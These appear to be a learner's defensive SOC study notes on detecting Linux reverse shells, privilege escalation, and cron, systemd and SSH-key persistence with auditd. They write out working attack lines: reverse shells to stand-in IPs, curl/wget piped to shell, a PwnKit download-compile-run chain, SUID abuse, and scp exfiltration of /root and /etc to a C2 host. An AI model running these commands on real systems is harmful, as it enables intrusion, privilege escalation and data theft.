# Reverse Shells (Linux)

Attackers who enter through an exploit or web vulnerability often don't get a usable terminal. A reverse shell fixes that, and it is a critical alert for the SOC.

## Why Attackers Need Them

SSH gives a convenient terminal (colors, autocompletion, `Ctrl+C`). An exploit or web flaw doesn't, and attackers may face:

- Buggy command output
- Execution delays and timeouts
- Rate limits
- Network restrictions

A **reverse shell** is a session opened **from the victim to the attacker**. It's more convenient and often the only way to continue. See the Shells Overview room for the basics (link not in the paste).

## Reverse Shell Methods

| Command on the victim | Explanation |
|---|---|
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | Victim connects to `10.10.10.10:1337` and launches `bash` for the attacker |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Socat version; attacker listens on `10.20.20.20:2525` |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` | Python version; attacker listens on `10.30.30.30:80` |

- The victim **connects out**, so inbound firewall rules don't block it
- The Python example uses port **80**, which blends with web traffic
- Odd ports like 1337 or 2525 are easier to spot, which is why attackers also use 80/443

## Why SOC Treats It as Critical

- The system is already breached
- A human attacker is actively trying to establish a shell and continue the attack
- Detectable with auditd

## Tracing the Origin (TryPingMe)

    ausearch -i -x socat
    proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
    ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

    ausearch -i --pid 27806
    proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
    ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec

    ausearch -i --pid 27796
    proctitle=/usr/bin/python3 /opt/trypingme/main.py
    exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec

Process tree:

    PID 1 (OS)
    └── python3 /opt/trypingme/main.py        (PID 27796, uid=serviceuser)
        └── /bin/sh -c ... && socat ...       (PID 27806)
            └── socat TCP:10.20.20.20:2525 EXEC:'bash'   (PID 27808)

| Clue | Meaning |
|---|---|
| Parent is the TryPingMe app | The web app was exploited (the command injection from the earlier note) |
| `auid=unset` | No login session, so a service ran it |
| `uid=serviceuser` | The attacker now has the app's privileges, not root |
| `/bin/sh -c 4 -W 1 127.0.0.1 && socat ...` | The injected command: the app's `ping` command with the payload chained on with `&&` |

- The shell command shows how the injection works: the app's `ping` arguments (`-c 2` cut off to `4 -W 1 127.0.0.1` in the log, my reading) end, then `&& socat ...` runs the attacker's command
- The lesson's `proctitle` begins with `4 -W 1 ...`; the start of the ping command is missing, so I can't tell the exact original input
- Timing: socat starts at 17:42:10, about 10 seconds after the app's parent process event at 17:41:57, so the exploit came first

## Listing What the Reverse Shell Did

    ausearch -i -x socat
    ausearch -i --ppid 27808 | grep proctitle

    proctitle=id
    proctitle=uname -a
    proctitle=ls -la .
    [...]

- `ppid 27808` is the `socat` PID, so these are commands typed in the attacker's shell
- `id`, `uname -a`, `ls -la .` are the standard Discovery commands, so Discovery follows straight after the shell
- Timestamps (17:42:12, :14, :25) are seconds apart: someone typing interactively
- Reverse shell is the bridge: web exploit, then reverse shell, then Discovery and the rest of the chain

## Detection Tips

- Alert on shell-spawning network tools: `socat`, `nc`/`ncat`, `bash -i`, `python -c` with `pty.spawn`
- Process tree rule: a web app or service (`python3`, `apache2`, `nginx`, `php-fpm`) should never have `bash`, `sh`, or `socat` children
- Look for `/dev/tcp/` in command lines: it's a Bash feature used for reverse shells
- Network side: a long-lived outbound connection from a server to an unfamiliar IP on an odd port (or 80/443) is a reverse shell sign; in the Sysmon-style notes this was Event ID 3 on port 4444
- Hunt in auditd:

        ausearch -i -x socat
        ausearch -i -x nc
        ausearch -i | grep -E '/dev/tcp|pty.spawn'

- After a hit: isolate the host, block the attacker IP, then review everything under `--ppid <shell_pid>` for follow-up actions (downloads, new users, persistence)
- Prevention (general knowledge, not in the lesson): run apps as low-privilege users, block unneeded outbound connections (egress filtering), and validate input to stop the original command injection

---

# Linux Privilege Escalation

Initial Access doesn't always mean full compromise. Web attacks and exploits often start as a low-privilege service user, sometimes confined to one folder (e.g. `/var/www/html`) or unable to download and run malware. Attackers then need Privilege Escalation to reach root.

## Discovery Drives the Escalation

| Discovery finding (IF) | Escalation (THEN) |
|---|---|
| `uname -a` shows an old, unpatched Ubuntu 16.04 | Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash` |
| `find /bin -perm 4000` finds `env` with the SUID flag | Abuse SUID for root: `/bin/env /bin/bash -p` |
| `ls /etc/ssh` exposes an unprotected `ssh-backup-key` | Use the key for root: `ssh root@127.0.0.1 -i ssh-backup-key` |

- SUID = a file runs with its **owner's** privileges (here root), so a misused SUID binary hands out root
- `bash -p` keeps the elevated privileges instead of dropping them
- The key example logs in to localhost: a low-privilege user reuses a leaked key to become root
- `wget ... | bash` in the lesson's first row is a pipe from `wget`, which wouldn't run the script (`wget` saves a file; `-O-` is needed to print it). Treat it as a simplified example

## Why Detection Is Hard

- Hundreds of SUID misconfigurations and thousands of software vulnerabilities, each exploited differently
- Universal approach: detect the **surrounding events**, not the exploit itself

## Example Attack: Three Detectable Steps

    # Detection 1: A spike of Discovery commands
    whoami                                                # returns "www-data"
    id; pwd; ls -la; crontab -l                           # basic Discovery
    ps aux | egrep "edr|splunk|elastic"                   # security tools Discovery
    uname -r                                              # returns an old 4.4 kernel

    # Detection 2: A download to the temp directory
    wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # exploit download
    gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # exploit compilation
    chmod +x /tmp/pwnkit                                  # make executable
    /tmp/pwnkit                                           # run the exploit

    # Detection 3: Data exfiltration with SCP
    whoami                                                # now returns "root"
    tar czf dump.tar.gz /root /etc/                       # archive sensitive data
    scp dump.tar.gz attacker@c2-server.thm:~              # exfiltrate

| Step | Indicators |
|---|---|
| 1. Discovery spike | `whoami`, `id`, `uname -r`; the `ps aux \| egrep "edr\|splunk\|elastic"` line shows the attacker checking for security tools |
| 2. Temp download | `wget` into `/tmp`, then `gcc`, `chmod +x`, run: download, compile, execute |
| 3. Exfiltration | `whoami` returns `root`, then `tar` of `/root` and `/etc/`, then `scp` out |

- Note the `www-data` user in step 1: a web server account, so the entry point was a web app
- `gcc` on a server is unusual and means the attacker compiles exploits on the victim
- The source code (`.c`) is downloaded, not a binary, which can avoid some AV checks
- Even without knowing how PwnKit works, the pattern (Discovery, `/tmp` download, compile) is universal

## Confirming Escalation Succeeded

Compare the effective user **before and after** the exploit. A change means the attacker elevated.

    ausearch -i -x pwnkit
    proctitle=/tmp/pwnkit
    ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec

    ausearch -i --ppid 24304
    proctitle=bash
    ppid=24304 pid=24310 auid=unset uid=root key=exec

    ausearch -i --ppid 24310
    proctitle=whoami
    ppid=24310 pid=24312 auid=unset uid=root key=exec

Tree:

    /tmp/pwnkit              (PID 24304, uid=serviceuser)
    └── bash                 (PID 24310, uid=root)
        └── whoami           (PID 24312, uid=root)

| Process | `uid` | Meaning |
|---|---|---|
| `/tmp/pwnkit` | `serviceuser` | Exploit launched by the low-privilege user |
| `bash` (its child) | `root` | The exploit spawned a **root shell**: escalation worked |
| `whoami` | `root` | The attacker continues as root |

- The red flag: a **child with a higher privilege than its parent**
- The root shell appears 0.65 seconds after the exploit (17:56:12.154 to 12.807)
- Auditd `auid=unset` throughout: no login session, consistent with a service/exploit chain (see the process tree note)
- After this point, the attacker can do anything: read `/etc/shadow`, add users, disable EDR

## Detection Tips

- Alert on the three surrounding patterns: Discovery spike, download to `/tmp` (especially followed by `chmod +x` or `gcc`), and exfiltration tools (`scp`, `curl`) after root appears
- Process tree rule: the child has a lower UID than its parent (e.g. `uid=serviceuser` parent, `uid=root` child) from a non-`sudo`, non-`su` binary
- Binaries running from `/tmp` or `/dev/shm`
- Hunt SUID files the way attackers do, to check your own systems:

        find / -perm -4000 -type f 2>/dev/null

- Compare against a known-good list; new SUID files (or `env`, `find`, `vim` with SUID) are a risk
- Check kernel version (`uname -r`) and patch level; old kernels and PwnKit-vulnerable `pkexec` are common targets
- Auditd rule idea (general knowledge; same syntax style as the auditd note):

        -w /etc/shadow -p wa -k shadow_change
        -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/gcc -k compiler_use

- Windows parallel: the SYSTEM/admin escalation notes, with the same before/after user comparison (Sysmon `User` field)
- Prevention (general knowledge): patch the OS and packages, audit SUID binaries, don't leave keys readable, run services with minimal privileges

---

# Linux Persistence: Cron and Systemd

Linux servers can run for years without a reboot, so some attackers don't rush to persist. Those after long-term access usually add one or two backdoors. The two most common methods are cron jobs and systemd services.

## Cron Persistence

- Cron jobs are the Linux equivalent of Windows scheduled tasks
- Simplest method, and the most popular

### Example 1: APT29 and GoldMax

- During a big espionage campaign, APT29 deployed GoldMax malware (CrowdStrike blog; link not in the paste)
- Added a line to the user's cron file: `/var/spool/cron/<user>`

        @reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &

- `@reboot` runs the malware on every boot
- `nohup` and `&` keep it running in the background
- `> /dev/null 2>&1` hides output
- Hidden directory (leading dot) in the user's home

### Example 2: Rocke Cryptominer

- Exploits public-facing services like Redis or phpMyAdmin
- Downloads a mining script from Pastebin and installs it as `/etc/cron.d/root` (Red Canary blog; link not in the paste)

        echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root

- `*/10` means every 10 minutes
- The script is re-downloaded each time, likely to restore its files quickly if IT deletes them
- Note: this is `curl | sh`, the download-and-run pattern from earlier notes

## Systemd Persistence

- Systemd services run the most critical components (DNS, SSH, most web services)
- Each is a `.service` file in `/lib/systemd/system` or `/etc/systemd/system`
- With root, anyone (including attackers) can create one
- Example: Sandworm created a `cloud-online` service so its GOGETTER malware runs on reboot (Mandiant report; link not in the paste)

        # Simplified /lib/systemd/system/cloud-online.service
        [Unit]
        Description=Initial cloud-online job    # fake description to mimic a trusted service
        [Service]
        ExecStart=/usr/bin/cloud-online         # GOGETTER disguised as a trusted file

- The fake name and description are the disguise
- The lesson's version has no `[Install]` section; real persistence on boot needs `WantedBy=multi-user.target` and `systemctl enable` (general knowledge), so this is simplified

## Cron vs Systemd

| | Cron | Systemd |
|---|---|---|
| Windows equivalent | Scheduled task | Service |
| Needs root | No (user crontab works) | Yes |
| Key paths | `/var/spool/cron/<user>`, `/etc/cron.d/` | `/lib/systemd/system/`, `/etc/systemd/system/` |
| Command to manage | `crontab -e` | `systemctl enable\|start` |
| Typical use | Simple, popular | Stronger, disguised as a real service |

## Detecting Persistence

Focus: catch the moment persistence is set up. Both methods are plain text files, so auditd can watch them.

| What to monitor | Where / what |
|---|---|
| Cron file changes | `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*` |
| Systemd folder changes | `/lib/systemd/system/*`, `/etc/systemd/system/*`, and less common locations |
| Related processes | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>` |

### Auditd Results

    ausearch -i -f /etc/systemd

    proctitle=vi /etc/systemd/system/malicious.service
    type=PATH ... name=/etc/systemd/system/malicious.service
    ... syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd

    ausearch -i -x crontab

    proctitle=crontab -e
    ... syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec

| Clue | Meaning |
|---|---|
| `-f /etc/systemd` | Searches by file path |
| `O_WRONLY\|O_CREAT\|O_EXCL` | File opened for writing, **created new** (`O_EXCL` fails if it exists) |
| `exe=/usr/bin/vi` | Created with the `vi` editor, i.e. by hand in a shell |
| `name=...malicious.service` | New service file (a lab name; real ones will look legitimate) |
| `ppid=1265` (both events) | Same parent shell ran both, so one session did both |
| `uid=root` | Root access was already obtained |

- A new file in a systemd folder is more telling than an edit to an existing one
- Both events share `ppid=1265`: trace that PID up with `ausearch -i --pid 1265` to find the login or exploit that started it (see the process tree note)

## Detection Tips

- Auditd watch rules (general knowledge; same syntax as the auditd note):

        -w /etc/crontab -p wa -k cron_persist
        -w /etc/cron.d/ -p wa -k cron_persist
        -w /var/spool/cron/ -p wa -k cron_persist
        -w /etc/systemd/system/ -p wa -k systemd_persist
        -w /lib/systemd/system/ -p wa -k systemd_persist

- Hunt existing persistence too:

        crontab -l; ls -la /etc/cron.d/ /var/spool/cron/
        systemctl list-unit-files --state=enabled

- Red flags in cron lines: `curl|sh`, `wget`, hidden directories, `/tmp` paths, `@reboot`, `nohup`, frequent schedules like `*/10`
- Red flags in service files: `ExecStart` pointing to `/tmp`, hidden folders, or a binary in an unusual path; description that copies a real service
- Check file times: a recently modified unit file that no one on the team created
- Windows parallel: the Windows persistence notes (Event ID 4698 for tasks, 4697 for services), same idea of watching the creation moment
- Related earlier note: the Dota3 attack used SSH key replacement instead; attackers often combine methods

---

# Linux Account and Application Persistence

Cron and systemd keep malware alive after a reboot. Account persistence keeps **access** alive without leaving any malware, so the attacker can return in a month to steal more. The method depends on how they got in.

## 1. New User Account

- Works when SSH is exposed
- Attacker creates a user, adds it to a privileged group, then logs in over SSH later
- Detect user creation in `auth.log`:

        cat /var/log/auth.log | grep -E 'useradd|usermod'

        useradd[27254]: new group: name=support, GID=1001
        useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash
        usermod[27258]: add 'support' to group 'sudo'
        usermod[27258]: add 'support' to shadow group 'sudo'

| Clue | Meaning |
|---|---|
| Name `support` | Looks like an IT account, so it blends in |
| `useradd` then `usermod ... 'sudo'` | Create, then grant admin; same pattern as Windows `4720` then `4732` |
| Two seconds apart (15:46:30 to :32) | Scripted or fast manual work |
| `shell=/bin/bash` | Account can log in interactively |

- Reconstruct the process tree with auditd, starting from the `useradd` PID (27254):

        ausearch -i --pid 27254      # see useradd and its ppid
        ausearch -i --ppid 27254     # children of that PID

- Walk up from the `ppid` to find the session or exploit that created the user

## 2. Backdoored SSH Keys

- Attacker adds their public key to a user's `authorized_keys`, then logs in with the key instead of a password
- Seen before in the Dota3 note (the `mdrfckr` key)
- Hard for IT to spot, because the bad key blends in with real ones

        echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys

        cat ~/.ssh/authorized_keys
        ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi    # legitimate
        ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ    # legitimate
        ssh-ed25519 AAAAC3Nza...IkiINvQt/R    # backdoor

- Default location: each user's `~/.ssh/authorized_keys`
- Best detection: **monitor file changes** with auditd, not process creation

### Why Process Logs Miss It

- `echo` is a shell builtin, so no separate process starts
- The command is logged as just `bash`

        ausearch -i -f /.ssh/authorized_keys

        proctitle=bash
        type=PATH ... name=/home/user/.ssh/authorized_keys
        type=SYSCALL ... syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd

- `-f` searches by file path
- Lines show `bash` writing to the file, which is the tell: a shell touching `authorized_keys`
- Mismatch in the lesson's sample: `proctitle=bash`, but `exe=/usr/bin/vi` and `key=systemd`. That looks copied from the previous systemd example, so don't treat those two fields as real evidence of `vi`

## 3. Application Persistence

- Example: a WordPress admin account is breached
- With admin rights, the attacker adds a backdoor such as a WSO web shell and runs commands through it
- No cron job or SSH key needed
- Lives in the application layer, so auditd and system logs often never see it
- Beyond this note's scope, but common
- If you removed every other persistence method and the malware still comes back, suspect a compromised public-facing app

## Comparison

| Method | Needs | Evidence | Easy to miss? |
|---|---|---|---|
| New user | Root | `auth.log` `useradd`/`usermod` | No |
| SSH key | Write access to user's home | File watch on `authorized_keys` | Yes (process logs miss it) |
| App backdoor | App admin | Web logs, app files | Yes (system logs miss it) |

## Detection Tips

- Auditd watch rules (general knowledge; same syntax as the auditd note):

        -w /etc/passwd -p wa -k account_change
        -w /etc/shadow -p wa -k account_change
        -w /etc/sudoers -p wa -k account_change
        -w /root/.ssh/authorized_keys -p wa -k ssh_keys

- Per-user keys: the rule needs one `-w` per home folder, or a directory watch like `-w /home/ -p wa`, which can get noisy
- Audit every `authorized_keys` regularly: unknown key, odd comment, or a changed timestamp
- Check recent account changes:

        grep -E 'useradd|usermod|userdel|passwd\[' /var/log/auth.log

- Group check: who is in `sudo`

        getent group sudo

- Use the pivot fields from earlier notes: `ppid` to find the shell, then `auth.log` for the login behind it
- Application persistence: compare web files against a clean copy, check for recently modified files in web roots, and review admin accounts and plugins
- Windows parallel: the Windows backdoored-user note (4720, 4732, 4724) and the web shell notes

# Linux as an Entry Point

A single compromised Linux server can open the door to a whole corporate network, even if 99% of the infrastructure is Windows. Linux machines usually run firewalls, web servers, mail servers, and other public-facing services, so they are often the first thing attackers reach. Final stage: [Impact](https://attack.mitre.org/tactics/TA0040/).

## Linux in Espionage

- Linux machines store sensitive data and run mission-critical networks, so state-sponsored groups target them
- Example: Kimsuky APT installed a backdoor on multiple important Linux targets ([Symantec article](https://www.security.com/threat-intelligence/springtail-kimsuky-backdoor-espionage))
- Persistence used: **systemd service**, the technique from the Linux persistence note
- Detect: new `.service` files in `/etc/systemd/system/` or `/lib/systemd/system/`

## Linux in Ransomware

- Linux ransomware is [on the rise](https://invenioit.com/security/linux-ransomware-attacks-rise/?srsltid=AfmBOoqCQp_0W_lZxIKX9OoiEmXNjK9ZEXx6S91fwY5bVre1o099D3wp#:~:text=EDR%20in%20Action%20%E2%86%92-,Does%20Ransomware%20Affect%20Linux%3F,-Yes%2C%20ransomware%20can)
- Hypervisors are a prime target

| Setup | Risk |
|---|---|
| Hundreds of Windows VMs on 3 Linux hypervisors | Breach 3 servers, encrypt every VM |

- Real-world breach example: [Varonis article on VMware ESXi ransomware](https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire#ransomware-payload)
- One host, huge blast radius: hypervisors need strict access control and monitoring

## MITRE ATT&CK Recap (Screenshot)

Yellow = techniques covered in the Linux notes. Counts like `(3/3)` show sub-techniques covered.

<img width="1568" height="578" alt="image" src="https://github.com/user-attachments/assets/52b42dbd-ddbb-49ea-8939-1eca8eec0014" />


## Detection Tips

- Use the matrix as a coverage checklist: for each tactic, ask "which log would catch this on Linux?"
  - Initial Access: `auth.log`, web logs
  - Execution, Discovery, Privesc: auditd `execve` and process tree
  - Persistence: auditd file watches on cron, systemd, `authorized_keys`
  - Lateral Movement and Exfiltration: network logs (the gaps above)
- Linux hosts are often public-facing, so put runtime logging (auditd) on them first
- Hypervisors need special attention: restrict who can SSH in, and alert on any new login or bulk shutdown/encrypt activity (general knowledge)
- Process tree is the one method that works across all the Linux notes: trace the suspicious command to its parent, then decide if the activity is legitimate
